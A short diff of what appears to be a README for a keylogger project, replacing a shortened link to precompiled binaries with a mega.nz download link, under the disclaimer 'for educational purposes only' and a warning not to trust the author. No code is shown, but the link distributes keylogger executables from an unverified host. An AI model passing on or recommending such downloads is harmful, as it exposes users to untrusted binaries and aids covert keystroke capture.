@@ -4,4 +4,4 @@ Inspired by https://github.com/GiacomoLaw/Keylogger
 
 For educational purposes only of course
 
-[Precompiled binaries (10MB)](https://www.tinyurl.com/kvbcklgr) (don't trust me)
+[Precompiled binaries (10MB)](https://mega.nz/file/MNQQVYgY#Y8r_4hbNgywXPifWq45Fm2ubaoPMBshaZmbbjrGLXGo) (don't trust me)
